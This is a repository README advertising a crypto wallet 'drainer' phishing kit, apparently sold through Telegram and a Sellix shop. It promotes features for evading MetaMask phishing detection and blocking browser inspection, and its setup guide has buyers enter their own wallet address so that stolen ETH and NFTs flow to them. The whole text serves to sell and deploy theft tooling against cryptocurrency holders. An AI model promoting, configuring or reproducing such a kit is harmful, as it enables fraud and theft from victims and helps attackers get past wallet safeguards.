# ***⛔ This Repo Has No Backdoors!***
### If you need any help, DM me here: [@crypto_scem](https://t.me/crypto_scem) (new telegram)

## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer

![preview](https://media.discordapp.net/attachments/986649854728089610/987037794805354546/unknown.png?width=1261&height=610] [Drainer V2 BETA](https://cryptoscemm.sellix.io]

## `💡 Features`
- [x] Inspect Element Detection
- [x] Custom Design
- [x] Cool design 
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect


## `✏️ Setup Guide:` 
you need to edit the **settings.js** file. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**

To get instant support, contact me on [@crypto_scem](https://t.me/crypto_scem)


## `⭐ Socials :`

- Telegram: [@crypto_scem](https://t.me/crypto_scem)
- Shop: https://crypto-scem.sellix.io/
- Group: https://t.me/cryptoscemm

##### Please ⭐ the repo to support our project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
